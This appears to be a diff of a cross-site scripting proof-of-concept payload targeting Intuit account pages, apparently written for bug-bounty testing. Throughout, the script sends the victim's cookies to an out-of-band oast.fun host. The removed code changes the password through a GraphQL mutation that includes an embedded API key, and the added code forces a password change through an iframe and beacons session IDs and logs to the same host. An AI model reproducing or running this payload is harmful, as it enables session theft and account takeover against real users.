@@ -1,63 +1,109 @@
 (async function(){
 var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
+var log=[];
 
 function gc(n){
 var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
 return m?decodeURIComponent(m[1]):''
 }
-function uid(){
-return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){
-var r=Math.random()*16|0;return(c==='x'?r:(r&0x3|0x8)).toString(16)
-})
-}
-
-var sid=gc('ius_session');
-var userId=gc('userIdentifier');
-var vid=gc('ivid');
 
 (new Image).src=O+'/xss-cookies?c='+encodeURIComponent(document.cookie);
 
+log.push('origin: '+location.origin);
+log.push('session: '+gc('ius_session'));
+log.push('userId: '+gc('userIdentifier'));
+
+document.body.innerHTML='<div id="status" style="font:14px monospace;background:#111;color:#0f0;padding:20px">Loading password page in iframe...</div>';
+
+var iframe=document.createElement('iframe');
+iframe.style.cssText='width:100%;height:500px;border:1px solid #333;margin-top:10px';
+iframe.src='https://accounts.intuit.com/app/account-manager/security/password';
+document.body.appendChild(iframe);
+
+iframe.onload=function(){
+log.push('iframe loaded');
+var tries=0;
+var maxTries=20;
+
+var interval=setInterval(function(){
+tries++;
 try{
-var r=await fetch('https://accounts.intuit.com/identity-api/v2/graphql',{
-method:'POST',
-credentials:'include',
-headers:{
-'Content-Type':'application/json',
-'Authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
-'intuit_offeringid':'Intuit.cto.iam.ius',
-'intuit_intentassetalias':'Intuit.cto.iam.ius',
-'intuit_sessionid':sid,
-'intuit_profilingid':sid,
-'intuit_routingid':userId,
-'intuit_visitorid':vid,
-'intuit_flowid':uid(),
-'intuit_tid':uid()
-},
-body:JSON.stringify({
-query:'mutation ReplacePassword($input:Identity_CreateOrReplacePasswordCredentialInput!){identityCreateOrReplacePasswordCredential(input:$input){__typename ...on Identity_CreateOrReplacePasswordCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}',
-variables:{input:{newPassword:'Poc@2027'}},
-operationName:'ReplacePassword'
-})
-});
+var doc=iframe.contentDocument||iframe.contentWindow.document;
+var inputs=doc.querySelectorAll('input[type="password"],input[name*="password"],input[name*="Password"]');
+log.push('try '+tries+': found '+inputs.length+' password inputs');
 
-var d=await r.json();
-var success=d.data&&d.data.identityCreateOrReplacePasswordCredential&&d.data.identityCreateOrReplacePasswordCredential.__typename==='Identity_CreateOrReplacePasswordCredentialSuccess';
+if(inputs.length>=2){
+clearInterval(interval);
+log.push('found password fields, filling...');
 
-(new Image).src=O+'/xss-pwd-result?success='+success+'&r='+encodeURIComponent(JSON.stringify(d));
+var setter=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;
 
-var color=success?'#0f0':'#f00';
-document.body.innerHTML='<div style="font:14px monospace;background:#0a0a0a;color:#eee;padding:30px;min-height:100vh">'
-+'<div style="background:'+(success?'#001a00':'#1a0000')+';border:2px solid '+color+';padding:20px;border-radius:8px;margin-bottom:20px">'
-+'<h1 style="color:'+color+';margin:0">XSS PoC — '+(success?'PASSWORD CHANGED':'Result')+'</h1></div>'
-+'<table style="border-collapse:collapse;font:13px monospace">'
-+'<tr><td style="color:#0ff;padding:6px">ius_session</td><td style="color:#ff0;padding:6px">'+sid+'</td></tr>'
-+'<tr><td style="color:#0ff;padding:6px">userIdentifier</td><td style="color:#ff0;padding:6px">'+userId+'</td></tr>'
-+'<tr><td style="color:#0ff;padding:6px">Password set to</td><td style="color:#f00;padding:6px;font-size:18px"><b>Poc@2027</b></td></tr>'
-+'<tr><td style="color:#0ff;padding:6px">API Response</td><td style="color:#ff0;padding:6px;word-break:break-all">'+JSON.stringify(d)+'</td></tr>'
-+'</table></div>'
-
-}catch(e){
-(new Image).src=O+'/xss-err?e='+encodeURIComponent(e.message);
-document.body.innerHTML='<div style="font:14px monospace;background:#111;color:red;padding:30px"><h1>Error</h1><p>'+e.message+'</p><p>session: '+sid+'</p><p>userId: '+userId+'</p></div>'
+for(var i=0;i<inputs.length;i++){
+setter.call(inputs[i],'Poc@2027');
+inputs[i].dispatchEvent(new Event('input',{bubbles:true}));
+inputs[i].dispatchEvent(new Event('change',{bubbles:true}));
+inputs[i].dispatchEvent(new Event('blur',{bubbles:true}));
 }
+
+log.push('fields filled, looking for save button...');
+
+setTimeout(function(){
+var doc2=iframe.contentDocument||iframe.contentWindow.document;
+var btns=doc2.querySelectorAll('button');
+var saveBtn=null;
+for(var j=0;j<btns.length;j++){
+var txt=btns[j].textContent.toLowerCase();
+if(txt.indexOf('save')!==-1||txt.indexOf('update')!==-1||txt.indexOf('submit')!==-1){
+saveBtn=btns[j];break
+}
+}
+if(!saveBtn){
+var submits=doc2.querySelectorAll('button[type="submit"]');
+if(submits.length) saveBtn=submits[0];
+}
+
+if(saveBtn){
+log.push('clicking save: "'+saveBtn.textContent.trim()+'"');
+saveBtn.click();
+
+setTimeout(function(){
+log.push('done - check if password changed');
+(new Image).src=O+'/xss-pwd-done?log='+encodeURIComponent(log.join('|'));
+document.getElementById('status').innerHTML='<h1 style="color:red">XSS PoC — Password Change Attempted</h1>'
++'<pre style="color:#0f0">'+log.join('\n')+'</pre>'
++'<p style="color:yellow">New password: <b>Poc@2027</b></p>'
++'<p style="color:#ccc">Check below iframe for result. Try logging in with new password.</p>'
+},3000);
+}else{
+log.push('no save button found');
+var allBtns=[];
+for(var k=0;k<btns.length;k++) allBtns.push(btns[k].textContent.trim());
+log.push('buttons found: '+JSON.stringify(allBtns));
+document.getElementById('status').innerHTML='<pre style="color:orange">'+log.join('\n')+'</pre>';
+(new Image).src=O+'/xss-no-btn?btns='+encodeURIComponent(allBtns.join(','));
+}
+},500);
+
+}else if(tries>=maxTries){
+clearInterval(interval);
+log.push('timeout waiting for password inputs');
+var html=doc.body?doc.body.innerHTML.substring(0,500):'empty';
+log.push('page content: '+html);
+document.getElementById('status').innerHTML='<pre style="color:red">'+log.join('\n')+'</pre>';
+(new Image).src=O+'/xss-timeout?log='+encodeURIComponent(log.join('|').substring(0,1000));
+}
+}catch(e){
+log.push('try '+tries+' error: '+e.message);
+if(tries>=maxTries){
+clearInterval(interval);
+document.getElementById('status').innerHTML='<pre style="color:red">'+log.join('\n')+'</pre>';
+}
+}
+},500);
+};
+
+iframe.onerror=function(){
+log.push('iframe load error');
+document.getElementById('status').innerHTML='<pre style="color:red">'+log.join('\n')+'</pre>';
+};
 })();
